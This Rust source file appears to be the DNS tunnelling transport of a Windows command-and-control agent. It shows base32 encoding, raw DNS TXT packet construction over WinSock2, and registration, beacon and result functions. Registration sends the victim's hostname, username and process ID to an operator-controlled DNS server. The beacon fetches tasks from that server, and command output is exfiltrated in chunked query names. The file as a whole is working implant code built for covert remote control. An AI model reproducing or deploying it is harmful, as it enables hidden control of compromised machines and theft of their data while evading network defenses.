//! DNS TXT transport — raw UDP, RFC 4648 base32, FNV-1a agent ID.
//!
//! Registration: base32-encode JSON, send in 48-char chunks:
//!   reg.<chunk>.<seq>.<total>.<agentID>.<domain>  → "ok"
//! Beacon: poll.<agentID>.<domain>
//!   → "nil" | "more:<N>" (chunked) | inline base32 task JSON
//! Result: res.<chunk>.<seq>.<total>.<taskHex>.<agentID>.<domain> → "ack"

// ── Base32 (RFC 4648, no padding, lowercase) ──────────────────────────────────

const B32L: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";

pub fn b32_encode(data: &[u8]) -> String {
    let mut out = Vec::new();
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    for &b in data {
        buf = (buf << 8) | b as u64;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            out.push(B32L[((buf >> bits) & 0x1f) as usize]);
        }
    }
    if bits > 0 {
        out.push(B32L[((buf << (5 - bits)) & 0x1f) as usize]);
    }
    String::from_utf8(out).unwrap_or_default()
}

pub fn b32_decode(s: &str) -> Vec<u8> {
    let alpha = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut out = Vec::new();
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    for c in s.to_ascii_uppercase().bytes() {
        if let Some(pos) = alpha.iter().position(|&x| x == c) {
            buf = (buf << 5) | pos as u64;
            bits += 5;
            if bits >= 8 {
                bits -= 8;
                out.push((buf >> bits) as u8);
            }
        }
    }
    out
}

// ── FNV-1a 64-bit ─────────────────────────────────────────────────────────────

pub fn fnv64(s: &str) -> u64 {
    let mut h: u64 = 14695981039346656037;
    for b in s.bytes() {
        h ^= b as u64;
        h = h.wrapping_mul(1099511628211);
    }
    h
}

pub fn make_agent_id(hostname: &str, pid: u32) -> String {
    format!("{:016x}", fnv64(&format!("{}{}", hostname, pid)))
}

// ── DNS TXT wire helpers ──────────────────────────────────────────────────────

fn build_dns_query(qname: &str) -> Vec<u8> {
    let mut msg: Vec<u8> = vec![
        0xab, 0xcd, 0x01, 0x00,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    for label in qname.trim_matches('.').split('.') {
        if label.is_empty() { continue; }
        msg.push(label.len() as u8);
        msg.extend_from_slice(label.as_bytes());
    }
    msg.push(0x00);
    msg.extend_from_slice(&[0x00, 0x10, 0x00, 0x01]); // TXT IN
    msg
}

pub fn parse_dns_txt(buf: &[u8]) -> String {
    if buf.len() < 12 { return String::new(); }
    let ancount = (buf[6] as usize) << 8 | buf[7] as usize;
    if ancount == 0 { return String::new(); }
    let mut pos = 12;
    // skip question section
    while pos < buf.len() {
        if buf[pos] == 0 { pos += 1; break; }
        if buf[pos] & 0xC0 == 0xC0 { pos += 2; break; }
        pos += buf[pos] as usize + 1;
    }
    if pos + 4 > buf.len() { return String::new(); }
    pos += 4;
    // parse answer records
    for _ in 0..ancount {
        if pos >= buf.len() { break; }
        while pos < buf.len() {
            if buf[pos] == 0 { pos += 1; break; }
            if buf[pos] & 0xC0 == 0xC0 { pos += 2; break; }
            pos += buf[pos] as usize + 1;
        }
        if pos + 10 > buf.len() { break; }
        let rtype = (buf[pos] as usize) << 8 | buf[pos+1] as usize;
        pos += 8;
        let rdlen = (buf[pos] as usize) << 8 | buf[pos+1] as usize;
        pos += 2;
        if pos + rdlen > buf.len() { break; }
        if rtype == 16 {
            let rdata = &buf[pos..pos+rdlen];
            pos += rdlen;
            let mut txt = Vec::new();
            let mut rp = 0;
            while rp < rdata.len() {
                let sl = rdata[rp] as usize; rp += 1;
                if rp + sl > rdata.len() { break; }
                txt.extend_from_slice(&rdata[rp..rp+sl]);
                rp += sl;
            }
            if !txt.is_empty() {
                return String::from_utf8_lossy(&txt).to_string();
            }
        } else {
            pos += rdlen;
        }
    }
    String::new()
}

// ── Raw UDP via WinSock2 ──────────────────────────────────────────────────────

#[repr(C)]
struct WsaData([u8; 408]);

#[repr(C)]
struct SockaddrIn {
    sin_family: u16,
    sin_port:   u16,
    sin_addr:   u32,
    sin_zero:   [u8; 8],
}

#[repr(C)]
struct Timeval { tv_sec: i32, tv_usec: i32 }

type WsSocket = usize;
const WS_INVALID_SOCKET: WsSocket = !0usize;

#[link(name = "ws2_32")]
extern "system" {
    fn WSAStartup(ver: u16, data: *mut WsaData) -> i32;
    fn socket(af: i32, typ: i32, proto: i32) -> WsSocket;
    fn sendto(s: WsSocket, buf: *const u8, len: i32, flags: i32,
              to: *const SockaddrIn, tolen: i32) -> i32;
    fn recvfrom(s: WsSocket, buf: *mut u8, len: i32, flags: i32,
                from: *mut SockaddrIn, fromlen: *mut i32) -> i32;
    fn setsockopt(s: WsSocket, level: i32, name: i32, val: *const u8, len: i32) -> i32;
    fn closesocket(s: WsSocket) -> i32;
    fn inet_addr(cp: *const u8) -> u32;
    fn htons(n: u16) -> u16;
}

fn ip_to_u32(ip: &str) -> u32 {
    let mut s = ip.to_string();
    s.push('\0');
    unsafe { inet_addr(s.as_ptr()) }
}

pub fn dns_query(server: &str, qname: &str) -> String {
    let (host, port) = if let Some(i) = server.rfind(':') {
        let p: u16 = server[i+1..].parse().unwrap_or(53);
        (&server[..i], p)
    } else {
        (server, 53u16)
    };
    unsafe {
        let mut wsa = WsaData([0u8; 408]);
        WSAStartup(0x0202, &mut wsa);
        let sock = socket(2, 2, 17); // AF_INET, SOCK_DGRAM, IPPROTO_UDP
        if sock == WS_INVALID_SOCKET { return String::new(); }
        let tv = Timeval { tv_sec: 5, tv_usec: 0 };
        setsockopt(sock, 0xffff, 0x1006, // SOL_SOCKET, SO_RCVTIMEO
            &tv as *const Timeval as *const u8,
            core::mem::size_of::<Timeval>() as i32);
        let dst = SockaddrIn {
            sin_family: 2u16,
            sin_port:   htons(port),
            sin_addr:   ip_to_u32(host),
            sin_zero:   [0; 8],
        };
        let msg = build_dns_query(qname);
        let sent = sendto(sock, msg.as_ptr(), msg.len() as i32, 0,
            &dst, core::mem::size_of::<SockaddrIn>() as i32);
        if sent < 0 { closesocket(sock); return String::new(); }
        let mut buf = [0u8; 4096];
        let mut from = core::mem::zeroed::<SockaddrIn>();
        let mut fromlen = core::mem::size_of::<SockaddrIn>() as i32;
        let got = recvfrom(sock, buf.as_mut_ptr(), 4096, 0, &mut from, &mut fromlen);
        closesocket(sock);
        if got <= 0 { return String::new(); }
        parse_dns_txt(&buf[..got as usize])
    }
}

// ── Chunk helper ──────────────────────────────────────────────────────────────

pub fn chunk_str(s: &str, size: usize) -> Vec<String> {
    let bytes = s.as_bytes();
    let mut chunks = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let end = (i + size).min(bytes.len());
        chunks.push(String::from_utf8_lossy(&bytes[i..end]).to_string());
        i = end;
    }
    chunks
}

// ── Transport operations ──────────────────────────────────────────────────────

pub fn register(server: &str, domain: &str) -> Option<String> {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let pid      = std::process::id();
    let agent_id = make_agent_id(&hostname, pid);

    let body = serde_json::json!({
        "hostname": hostname,
        "username": std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
        "os":       "windows/amd64",
        "pid":      pid,
        "aes_key":  "",
        "language": "rust",
    }).to_string();

    let encoded = b32_encode(body.as_bytes());
    let chunks  = chunk_str(&encoded, 48);
    let total   = chunks.len();
    for (seq, chunk) in chunks.iter().enumerate() {
        let qname = format!("reg.{}.{}.{}.{}.{}", chunk, seq, total, agent_id, domain);
        let resp  = dns_query(server, &qname);
        if !resp.starts_with("ok") { return None; }
    }
    Some(agent_id)
}

pub fn beacon(server: &str, domain: &str, agent_id: &str) -> Option<Vec<u8>> {
    let resp = dns_query(server, &format!("poll.{}.{}", agent_id, domain));
    if resp.is_empty() || resp == "nil" { return None; }

    let encoded = if resp.starts_with("more:") {
        let total: usize = resp[5..].parse().unwrap_or(0);
        let mut parts = Vec::new();
        for i in 0..total {
            let r = dns_query(server, &format!("chunk.{}.{}.{}", i, agent_id, domain));
            parts.push(r.trim_start_matches("chunk:").to_string());
        }
        parts.join("")
    } else {
        resp
    };

    let decoded = b32_decode(&encoded);
    if decoded.is_empty() { return None; }
    Some(decoded)
}

pub fn send_result(server: &str, domain: &str, agent_id: &str,
                   task_id: i64, output: &str, error: &str) {
    let body = serde_json::json!({
        "task_id": task_id,
        "output":  output,
        "error":   error,
    }).to_string();
    let encoded  = b32_encode(body.as_bytes());
    let chunks   = chunk_str(&encoded, 48);
    let total    = chunks.len();
    let task_hex = format!("{:x}", task_id);
    for (seq, chunk) in chunks.iter().enumerate() {
        let qname = format!("res.{}.{}.{}.{}.{}.{}", chunk, seq, total, task_hex, agent_id, domain);
        let _ = dns_query(server, &qname);
    }
}
